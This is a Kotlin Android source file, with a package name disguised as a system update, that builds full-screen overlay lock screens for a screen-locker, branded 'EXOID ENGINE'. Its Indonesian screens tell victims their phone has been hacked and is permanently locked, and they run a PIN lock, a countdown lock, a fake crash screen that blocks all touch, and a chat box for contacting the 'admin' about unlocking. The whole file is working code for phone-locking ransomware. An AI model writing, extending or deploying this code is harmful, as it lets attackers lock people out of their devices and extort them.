package com.system.update

import android.animation.ObjectAnimator
import android.animation.ValueAnimator
import android.content.Context
import android.graphics.Canvas
import android.graphics.Color
import android.graphics.Paint
import android.graphics.PixelFormat
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.TypedValue
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.widget.EditText
import android.widget.FrameLayout
import android.widget.LinearLayout
import android.widget.TextView
import kotlin.random.Random

object LockOverlayView {

    fun paramsFull(): WindowManager.LayoutParams {
        val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
        else
            @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_PHONE

        return WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            type,
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                    WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                    WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD or
                    WindowManager.LayoutParams.FLAG_FULLSCREEN or
                    WindowManager.LayoutParams.FLAG_ALT_FOCUSABLE_IM,
            PixelFormat.TRANSLUCENT
        ).apply {
            gravity = Gravity.CENTER
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                layoutInDisplayCutoutMode =
                    WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
            }
        }
    }

    private fun dp(ctx: Context, value: Int): Int =
        TypedValue.applyDimension(
            TypedValue.COMPLEX_UNIT_DIP,
            value.toFloat(),
            ctx.resources.displayMetrics
        ).toInt()

    private fun cardBg(): GradientDrawable {
        return GradientDrawable().apply {
            shape = GradientDrawable.RECTANGLE
            cornerRadius = 40f
            setColor(Color.parseColor("#CC0A1A0A"))
            setStroke(5, Color.parseColor("#00FF66"))
            gradientType = GradientDrawable.LINEAR_GRADIENT
            orientation = GradientDrawable.Orientation.TL_BR
            colors = intArrayOf(
                Color.parseColor("#E60A0A0A"),
                Color.parseColor("#E61A0000")
            )
        }
    }

    // ============================================================
    // MATRIX BACKGROUND VIEW
    // ============================================================
    class MatrixBgView(context: Context) : View(context) {
        private val paint = Paint().apply {
            color = Color.parseColor("#00FF66")
            textSize = 32f
            typeface = Typeface.MONOSPACE
            isAntiAlias = true
        }
        private val chars = "01アイウエオカキクケコサシスセソタチツテトABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()<>?/\\|".toCharArray()
        private val columns = mutableListOf<Float>()
        private val drops = mutableListOf<Float>()
        private val speeds = mutableListOf<Float>()
        private val handler = Handler(Looper.getMainLooper())
        private var running = true

        init {
            paint.alpha = 140
        }

        override fun onSizeChanged(w: Int, h: Int, oldw: Int, oldh: Int) {
            super.onSizeChanged(w, h, oldw, oldh)
            columns.clear(); drops.clear(); speeds.clear()
            var x = 0f
            while (x < w) {
                columns.add(x)
                drops.add(Random.nextFloat() * h)
                speeds.add(15f + Random.nextFloat() * 35f)
                x += 34f
            }
        }

        override fun onDraw(canvas: Canvas) {
            super.onDraw(canvas)
            canvas.drawColor(Color.parseColor("#FF0A0A0A"))

            for (i in columns.indices) {
                val c = chars[Random.nextInt(chars.size)]
                val alpha = 100 + Random.nextInt(155)
                paint.alpha = alpha
                canvas.drawText(c.toString(), columns[i], drops[i], paint)

                drops[i] += speeds[i]
                if (drops[i] > height) {
                    drops[i] = 0f
                    speeds[i] = 15f + Random.nextFloat() * 35f
                }
            }
        }

        fun startAnimationLoop() {
            val r = object : Runnable {
                override fun run() {
                    if (!running) return
                    invalidate()
                    handler.postDelayed(this, 60)
                }
            }
            handler.post(r)
        }

        fun stopAnimationLoop() {
            running = false
            handler.removeCallbacksAndMessages(null)
        }
    }

    // ============================================================
    // CHAT SECTION
    // ============================================================
    private fun makeChatSection(ctx: Context, onChat: ((String) -> Unit)?): View? {
        if (onChat == null) return null

        val container = LinearLayout(ctx).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(ctx, 4), dp(ctx, 14), dp(ctx, 4), dp(ctx, 4))
        }

        val label = TextView(ctx).apply {
            text = "💬 CHAT DENGAN ADMIN"
            setTextColor(Color.parseColor("#00FF66"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 11f)
            setTypeface(null, Typeface.BOLD)
            gravity = Gravity.CENTER
            letterSpacing = 0.2f
            setPadding(0, 0, 0, dp(ctx, 8))
        }

        val inputRow = LinearLayout(ctx).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
        }

        val input = EditText(ctx).apply {
            hint = "Tulis pesan untuk admin..."
            setHintTextColor(Color.parseColor("#3A8A3A"))
            setTextColor(Color.parseColor("#00FF66"))
            textSize = 13f
            typeface = Typeface.MONOSPACE
            background = GradientDrawable().apply {
                shape = GradientDrawable.RECTANGLE
                cornerRadius = 20f
                setColor(Color.parseColor("#CC0A0A0A"))
                setStroke(2, Color.parseColor("#00FF66"))
            }
            setPadding(dp(ctx, 14), dp(ctx, 12), dp(ctx, 14), dp(ctx, 12))
            maxLines = 3
            isFocusable = true
            isFocusableInTouchMode = true
            layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
        }

        val sendBtn = TextView(ctx).apply {
            text = "KIRIM"
            setTextColor(Color.WHITE)
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 12f)
            setTypeface(null, Typeface.BOLD)
            gravity = Gravity.CENTER
            background = GradientDrawable().apply {
                shape = GradientDrawable.RECTANGLE
                cornerRadius = 20f
                setColor(Color.parseColor("#B30000"))
                setStroke(2, Color.parseColor("#00FF66"))
            }
            setPadding(dp(ctx, 16), dp(ctx, 12), dp(ctx, 16), dp(ctx, 12))
            val lp = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
            lp.setMargins(dp(ctx, 8), 0, 0, 0)
            layoutParams = lp
            isClickable = true
            isFocusable = true
            setOnClickListener {
                val txt = input.text.toString().trim()
                if (txt.isNotEmpty()) {
                    onChat(txt)
                    input.setText("")
                }
            }
        }

        inputRow.addView(input)
        inputRow.addView(sendBtn)

        container.addView(label)
        container.addView(inputRow)
        return container
    }

    // ============================================================
    // LOCK PIN
    // ============================================================
    fun buildPin(ctx: Context, correctPin: String, onUnlock: (View) -> Unit, onChat: ((String) -> Unit)? = null): View {
        val root = FrameLayout(ctx).apply {
            setBackgroundColor(Color.parseColor("#0A0A0A"))
            isClickable = true
            isFocusable = true
        }

        // Matrix background
        val matrix = MatrixBgView(ctx)
        root.addView(matrix, FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.MATCH_PARENT
        ))
        matrix.startAnimationLoop()

        // Overlay gelap biar card keliatan
        val dark = View(ctx).apply {
            setBackgroundColor(Color.parseColor("#99000000"))
        }
        root.addView(dark, FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.MATCH_PARENT
        ))

        val card = LinearLayout(ctx).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setPadding(dp(ctx, 20), dp(ctx, 24), dp(ctx, 20), dp(ctx, 24))
            background = cardBg()
        }

        val icon = TextView(ctx).apply {
            text = "☠"
            setTextColor(Color.parseColor("#00FF66"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 52f)
            gravity = Gravity.CENTER
        }

        val logo = TextView(ctx).apply {
            text = "EXOID ENGINE"
            setTextColor(Color.parseColor("#F5D76E"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 20f)
            setTypeface(Typeface.MONOSPACE, Typeface.BOLD)
            gravity = Gravity.CENTER
            letterSpacing = 0.25f
            setPadding(0, dp(ctx, 6), 0, dp(ctx, 2))
        }

        val logoSub = TextView(ctx).apply {
            text = ">> LOCK BY EXOID ENGINE <<"
            setTextColor(Color.parseColor("#00FF66"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 10f)
            setTypeface(Typeface.MONOSPACE, Typeface.BOLD)
            gravity = Gravity.CENTER
            letterSpacing = 0.3f
            setPadding(0, 0, 0, dp(ctx, 14))
        }

        val divider = View(ctx).apply {
            setBackgroundColor(Color.parseColor("#00FF66"))
        }
        val dividerParams = LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            dp(ctx, 2)
        ).apply { setMargins(0, 0, 0, dp(ctx, 14)) }

        val title = TextView(ctx).apply {
            text = "[ DEVICE TERKUNCI ]"
            setTextColor(Color.parseColor("#E60000"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 16f)
            setTypeface(Typeface.MONOSPACE, Typeface.BOLD)
            gravity = Gravity.CENTER
            letterSpacing = 0.2f
        }

        val subtitle = TextView(ctx).apply {
            text = "Masukkan 4 angka PIN"
            setTextColor(Color.parseColor("#9A9A9A"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 11f)
            gravity = Gravity.CENTER
            setPadding(0, dp(ctx, 4), 0, dp(ctx, 14))
        }

        val pinDisplay = LinearLayout(ctx).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER
        }

        val pinBoxes = mutableListOf<TextView>()
        for (i in 0 until 4) {
            val box = TextView(ctx).apply {
                text = "_"
                setTextColor(Color.parseColor("#00FF66"))
                setTextSize(TypedValue.COMPLEX_UNIT_SP, 26f)
                setTypeface(Typeface.MONOSPACE, Typeface.BOLD)
                gravity = Gravity.CENTER
                background = GradientDrawable().apply {
                    shape = GradientDrawable.RECTANGLE
                    cornerRadius = 12f
                    setColor(Color.parseColor("#CC0A0A0A"))
                    setStroke(2, Color.parseColor("#00FF66"))
                }
                setPadding(0, dp(ctx, 10), 0, 0)
            }
            val lp = LinearLayout.LayoutParams(dp(ctx, 44), dp(ctx, 52))
            lp.setMargins(dp(ctx, 4), 0, dp(ctx, 4), 0)
            pinDisplay.addView(box, lp)
            pinBoxes.add(box)
        }

        val status = TextView(ctx).apply {
            text = ""
            setTextColor(Color.parseColor("#E60000"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 11f)
            gravity = Gravity.CENTER
            setPadding(0, dp(ctx, 10), 0, dp(ctx, 8))
        }

        val pinBuffer = StringBuilder()

        fun refreshBoxes() {
            for (i in 0 until 4) {
                pinBoxes[i].text = if (i < pinBuffer.length) "●" else "_"
            }
        }

        fun trySubmit() {
            if (pinBuffer.length == 4) {
                if (pinBuffer.toString() == correctPin) {
                    matrix.stopAnimationLoop()
                    onUnlock(root)
                } else {
                    status.text = ">> PIN SALAH <<"
                    for (b in pinBoxes) {
                        ObjectAnimator.ofFloat(b, "translationX", 0f, 18f, -18f, 18f, -18f, 0f).apply {
                            duration = 400
                            start()
                        }
                    }
                    pinBuffer.setLength(0)
                    root.postDelayed({
                        refreshBoxes()
                        status.text = ""
                    }, 600)
                }
            }
        }

        val keypad = LinearLayout(ctx).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
        }

        val btnSize = dp(ctx, 50)
        val btnMargin = dp(ctx, 4)

        fun makeKey(label: String, isDanger: Boolean, onClick: () -> Unit): TextView {
            return TextView(ctx).apply {
                text = label
                setTextColor(if (isDanger) Color.parseColor("#E60000") else Color.parseColor("#00FF66"))
                setTextSize(TypedValue.COMPLEX_UNIT_SP, 18f)
                setTypeface(Typeface.MONOSPACE, Typeface.BOLD)
                gravity = Gravity.CENTER
                background = GradientDrawable().apply {
                    shape = GradientDrawable.RECTANGLE
                    cornerRadius = 14f
                    setColor(Color.parseColor(if (isDanger) "#CC1A0000" else "#CC0A0A0A"))
                    setStroke(2, Color.parseColor(if (isDanger) "#E60000" else "#00FF66"))
                }
                isClickable = true
                isFocusable = true
                setOnClickListener {
                    try {
                        ObjectAnimator.ofFloat(this, "scaleX", 1f, 0.9f, 1f).apply {
                            duration = 120
                            start()
                        }
                        ObjectAnimator.ofFloat(this, "scaleY", 1f, 0.9f, 1f).apply {
                            duration = 120
                            start()
                        }
                    } catch (_: Exception) {}
                    onClick()
                }
            }
        }

        fun addRow(numbers: List<String>) {
            val row = LinearLayout(ctx).apply {
                orientation = LinearLayout.HORIZONTAL
                gravity = Gravity.CENTER
            }
            for (n in numbers) {
                val isDel = n == "DEL"
                val label = if (isDel) "⌫" else n
                val key = makeKey(label, isDel) {
                    when (n) {
                        "DEL" -> {
                            if (pinBuffer.length > 0) {
                                pinBuffer.setLength(pinBuffer.length - 1)
                                refreshBoxes()
                            }
                        }
                        "OK" -> trySubmit()
                        else -> {
                            if (pinBuffer.length < 4) {
                                pinBuffer.append(n)
                                refreshBoxes()
                                trySubmit()
                            }
                        }
                    }
                }
                val lp = LinearLayout.LayoutParams(btnSize, btnSize)
                lp.setMargins(btnMargin, btnMargin, btnMargin, btnMargin)
                row.addView(key, lp)
            }
            keypad.addView(row)
        }

        addRow(listOf("1", "2", "3"))
        addRow(listOf("4", "5", "6"))
        addRow(listOf("7", "8", "9"))
        addRow(listOf("DEL", "0", "OK"))

        val floating = TextView(ctx).apply {
            text = ">> SYSTEM LOCKED <<"
            setTextColor(Color.parseColor("#00FF66"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 10f)
            typeface = Typeface.MONOSPACE
            alpha = 0.5f
            letterSpacing = 0.4f
            gravity = Gravity.CENTER
            setPadding(0, dp(ctx, 10), 0, 0)
        }
        ObjectAnimator.ofFloat(floating, "alpha", 0.2f, 0.9f, 0.2f).apply {
            duration = 1500
            repeatCount = ValueAnimator.INFINITE
            start()
        }

        card.addView(icon)
        card.addView(logo)
        card.addView(logoSub)
        card.addView(divider, dividerParams)
        card.addView(title)
        card.addView(subtitle)
        card.addView(pinDisplay)
        card.addView(status)
        card.addView(keypad)

        val chatView = makeChatSection(ctx, onChat)
        if (chatView != null) card.addView(chatView)

        card.addView(floating)

        val cardParams = FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.WRAP_CONTENT
        ).apply {
            setMargins(dp(ctx, 16), 0, dp(ctx, 16), 0)
            gravity = Gravity.CENTER
        }
        root.addView(card, cardParams)

        return root
    }

    // ============================================================
    // LOCK HARD
    // ============================================================
    fun buildHard(ctx: Context, onChat: ((String) -> Unit)? = null): View {
        val root = FrameLayout(ctx).apply {
            setBackgroundColor(Color.parseColor("#0A0A0A"))
            isClickable = true
            isFocusable = true
        }

        val matrix = MatrixBgView(ctx)
        root.addView(matrix, FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.MATCH_PARENT
        ))
        matrix.startAnimationLoop()

        val dark = View(ctx).apply {
            setBackgroundColor(Color.parseColor("#99000000"))
        }
        root.addView(dark, FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.MATCH_PARENT
        ))

        val container = LinearLayout(ctx).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setPadding(dp(ctx, 24), dp(ctx, 32), dp(ctx, 24), dp(ctx, 32))
            background = cardBg()
        }

        val triangle = TextView(ctx).apply {
            text = "⚠"
            setTextColor(Color.parseColor("#00FF66"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 100f)
            gravity = Gravity.CENTER
        }
        ObjectAnimator.ofFloat(triangle, "scaleX", 1f, 1.15f, 1f).apply {
            duration = 1600
            repeatCount = ValueAnimator.INFINITE
            start()
        }
        ObjectAnimator.ofFloat(triangle, "scaleY", 1f, 1.15f, 1f).apply {
            duration = 1600
            repeatCount = ValueAnimator.INFINITE
            start()
        }

        val title = TextView(ctx).apply {
            text = "HAHAHA HP LU TERKUNCI HARD!!!!"
            setTextColor(Color.parseColor("#E60000"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 17f)
            setTypeface(Typeface.MONOSPACE, Typeface.BOLD)
            gravity = Gravity.CENTER
            setPadding(0, dp(ctx, 20), 0, dp(ctx, 6))
        }

        val logo = TextView(ctx).apply {
            text = ">> LOCK BY EXOID ENGINE <<"
            setTextColor(Color.parseColor("#00FF66"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 12f)
            setTypeface(Typeface.MONOSPACE, Typeface.BOLD)
            gravity = Gravity.CENTER
            letterSpacing = 0.2f
            setPadding(0, dp(ctx, 6), 0, dp(ctx, 16))
        }

        val msg = TextView(ctx).apply {
            text = "Perangkat terkunci permanen.\nMatikan daya untuk melepas."
            setTextColor(Color.parseColor("#E0E0E0"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 12f)
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, dp(ctx, 20))
        }

        val warning = TextView(ctx).apply {
            text = "JANGAN MATIKAN DAYA"
            setTextColor(Color.parseColor("#00FF66"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 13f)
            setTypeface(Typeface.MONOSPACE, Typeface.BOLD)
            gravity = Gravity.CENTER
        }
        ObjectAnimator.ofFloat(warning, "alpha", 0.3f, 1f, 0.3f).apply {
            duration = 1200
            repeatCount = ValueAnimator.INFINITE
            start()
        }

        container.addView(triangle)
        container.addView(title)
        container.addView(logo)
        container.addView(msg)

        val chatView = makeChatSection(ctx, onChat)
        if (chatView != null) container.addView(chatView)

        container.addView(warning)

        val lp = FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.WRAP_CONTENT
        ).apply {
            setMargins(dp(ctx, 20), 0, dp(ctx, 20), 0)
            gravity = Gravity.CENTER
        }
        root.addView(container, lp)

        return root
    }

    // ============================================================
    // LOCK TIMER
    // ============================================================
    fun buildTimer(ctx: Context, durationMs: Long, onUnlock: (View) -> Unit, onChat: ((String) -> Unit)? = null): View {
        val root = FrameLayout(ctx).apply {
            setBackgroundColor(Color.parseColor("#0A0A0A"))
            isClickable = true
            isFocusable = true
        }

        val matrix = MatrixBgView(ctx)
        root.addView(matrix, FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.MATCH_PARENT
        ))
        matrix.startAnimationLoop()

        val dark = View(ctx).apply {
            setBackgroundColor(Color.parseColor("#99000000"))
        }
        root.addView(dark, FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.MATCH_PARENT
        ))

        val container = LinearLayout(ctx).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setPadding(dp(ctx, 24), dp(ctx, 32), dp(ctx, 24), dp(ctx, 32))
            background = cardBg()
        }

        val triangle = TextView(ctx).apply {
            text = "⚠"
            setTextColor(Color.parseColor("#FFC107"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 80f)
            gravity = Gravity.CENTER
        }
        ObjectAnimator.ofFloat(triangle, "alpha", 0.4f, 1f, 0.4f).apply {
            duration = 1400
            repeatCount = ValueAnimator.INFINITE
            start()
        }

        val title = TextView(ctx).apply {
            text = "HP ANDA SUDAH KAMI RETAS"
            setTextColor(Color.parseColor("#E60000"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 16f)
            setTypeface(Typeface.MONOSPACE, Typeface.BOLD)
            gravity = Gravity.CENTER
            setPadding(0, dp(ctx, 20), 0, dp(ctx, 6))
        }

        val logo = TextView(ctx).apply {
            text = ">> LOCK BY EXOID ENGINE <<"
            setTextColor(Color.parseColor("#00FF66"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 11f)
            setTypeface(Typeface.MONOSPACE, Typeface.BOLD)
            gravity = Gravity.CENTER
            letterSpacing = 0.2f
            setPadding(0, dp(ctx, 6), 0, dp(ctx, 16))
        }

        val message = TextView(ctx).apply {
            text = "Mohon bicara baik-baik jika mau di lepas lock nya."
            setTextColor(Color.parseColor("#D4AF37"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 12f)
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, dp(ctx, 20))
        }

        val timerText = TextView(ctx).apply {
            setTextColor(Color.parseColor("#00FF66"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 44f)
            setTypeface(Typeface.MONOSPACE, Typeface.BOLD)
            gravity = Gravity.CENTER
            letterSpacing = 0.15f
        }

        val subTimer = TextView(ctx).apply {
            text = "WAKTU TERSISA"
            setTextColor(Color.parseColor("#9A9A9A"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 10f)
            gravity = Gravity.CENTER
            setPadding(0, dp(ctx, 6), 0, 0)
        }

        container.addView(triangle)
        container.addView(title)
        container.addView(logo)
        container.addView(message)
        container.addView(timerText)
        container.addView(subTimer)

        val chatView = makeChatSection(ctx, onChat)
        if (chatView != null) container.addView(chatView)

        val lp = FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.WRAP_CONTENT
        ).apply {
            setMargins(dp(ctx, 20), 0, dp(ctx, 20), 0)
            gravity = Gravity.CENTER
        }
        root.addView(container, lp)

        val handler = Handler(Looper.getMainLooper())
        val endTime = System.currentTimeMillis() + durationMs
        handler.post(object : Runnable {
            override fun run() {
                val left = endTime - System.currentTimeMillis()
                if (left <= 0) {
                    matrix.stopAnimationLoop()
                    onUnlock(root)
                    return
                }
                val d = left / 86_400_000
                val h = (left % 86_400_000) / 3_600_000
                val m = (left % 3_600_000) / 60_000
                val s = (left % 60_000) / 1000
                timerText.text = if (d > 0)
                    String.format("%dd %02d:%02d:%02d", d, h, m, s)
                else
                    String.format("%02d:%02d:%02d", h, m, s)
                handler.postDelayed(this, 1000)
            }
        })

        return root
    }

    // ============================================================
    // CRASH
    // ============================================================
    fun buildCrash(ctx: Context, onDismiss: (View) -> Unit): View {
        val root = FrameLayout(ctx).apply {
            setBackgroundColor(Color.parseColor("#0A0A0A"))
            isClickable = true
            isFocusable = true
        }

        val matrix = MatrixBgView(ctx)
        root.addView(matrix, FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.MATCH_PARENT
        ))
        matrix.startAnimationLoop()

        val container = LinearLayout(ctx).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setPadding(dp(ctx, 24), dp(ctx, 32), dp(ctx, 24), dp(ctx, 32))
        }

        val error = TextView(ctx).apply {
            text = "⚠"
            setTextColor(Color.parseColor("#E60000"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 80f)
            gravity = Gravity.CENTER
        }

        val title = TextView(ctx).apply {
            text = "SYSTEM ERROR"
            setTextColor(Color.parseColor("#E60000"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 24f)
            setTypeface(Typeface.MONOSPACE, Typeface.BOLD)
            gravity = Gravity.CENTER
            letterSpacing = 0.3f
            setPadding(0, dp(ctx, 16), 0, dp(ctx, 8))
        }

        val logo = TextView(ctx).apply {
            text = ">> LOCK BY EXOID ENGINE <<"
            setTextColor(Color.parseColor("#00FF66"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 12f)
            setTypeface(Typeface.MONOSPACE, Typeface.BOLD)
            gravity = Gravity.CENTER
            letterSpacing = 0.2f
        }

        val hint = TextView(ctx).apply {
            text = "TOUCH DISABLED"
            setTextColor(Color.parseColor("#00FF66"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 12f)
            gravity = Gravity.CENTER
            alpha = 0.6f
            setPadding(0, dp(ctx, 16), 0, 0)
        }
        ObjectAnimator.ofFloat(hint, "alpha", 0.2f, 0.9f, 0.2f).apply {
            duration = 1400
            repeatCount = ValueAnimator.INFINITE
            start()
        }

        container.addView(error)
        container.addView(title)
        container.addView(logo)
        container.addView(hint)

        val lp = FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.WRAP_CONTENT
        ).apply {
            setMargins(dp(ctx, 20), 0, dp(ctx, 20), 0)
            gravity = Gravity.CENTER
        }
        root.addView(container, lp)

        root.setOnTouchListener { _, _ -> true }
        return root
    }
}